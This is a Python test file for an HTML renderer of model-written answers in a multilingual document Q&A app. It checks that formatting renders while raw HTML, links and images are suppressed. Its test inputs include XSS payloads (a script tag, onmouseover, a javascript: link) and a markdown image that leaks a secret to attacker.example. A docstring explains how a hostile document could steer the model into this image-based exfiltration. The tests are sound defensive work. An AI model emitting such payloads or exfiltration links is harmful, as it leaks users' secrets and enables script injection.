"""S6: an answer's own formatting, and what must never render from it.

The answer is model output written from the operator's documents, so
every "switched off" rule in `ui/answer_format.py` is a line an attacker's
PDF could otherwise cross. Each of those gets a test of its own.
"""

from __future__ import annotations

from markupsafe import Markup

from ui.answer_format import render_answer


def test_bold_and_a_bullet_list_become_real_markup():
    html = render_answer("**Période d'essai** :\n\n- trois mois\n- renouvelable")

    assert "<strong>Période d'essai</strong>" in html
    assert '<li dir="auto">trois mois</li>' in html
    assert '<li dir="auto">renouvelable</li>' in html
    assert "**" not in html
    assert "- trois" not in html


def test_a_numbered_list_keeps_its_order():
    html = render_answer("1. Notifier par écrit\n2. Respecter le préavis")

    assert "<ol>" in html
    assert html.index("Notifier") < html.index("Respecter")


def test_a_table_renders_and_scrolls_inside_the_bubble():
    html = render_answer("| Catégorie | Durée |\n|---|---|\n| Cadres | 3 mois |")

    assert '<table class="prose__table">' in html
    assert '<th dir="auto">Catégorie</th>' in html
    assert '<td dir="auto">3 mois</td>' in html


def test_a_single_newline_is_still_a_line_break():
    """The old screen used `white-space: pre-line`, so an answer written
    with plain line breaks must not collapse into one run-on line."""
    html = render_answer("Cadres : trois mois\nEmployés : un mois et demi")

    assert "<br" in html


def test_raw_html_from_the_model_is_shown_as_text_never_run():
    html = render_answer("<script>alert('x')</script>\n\n<b onmouseover=x>hi</b>")

    assert "<script" not in html
    assert "<b " not in html
    assert "&lt;script&gt;" in html


def test_an_image_is_never_rendered_so_nothing_is_fetched():
    """A hostile document could steer the model into writing an image whose
    URL carries a secret. A rendered <img> would send it the moment the
    answer appears, with no click."""
    html = render_answer("Voir ![x](https://attacker.example/?q=secret)")

    assert "<img" not in html
    assert "src=" not in html


def test_links_and_autolinks_are_never_rendered():
    html = render_answer(
        "[ouvrir](javascript:alert(1)) [site](https://example.com) "
        "<https://example.com>"
    )

    assert "<a" not in html
    assert "href=" not in html


def test_arabic_and_french_lines_each_pick_their_own_direction():
    html = render_answer("مدة التجربة ثلاثة أشهر.\n\nLa période est de trois mois.")

    assert html.count('<p dir="auto">') == 2


def test_the_result_is_marked_safe_for_the_template():
    """Without Markup, Jinja would escape the <strong> this module just
    produced and the reader would see tags instead of bold text."""
    assert isinstance(render_answer("**x**"), Markup)
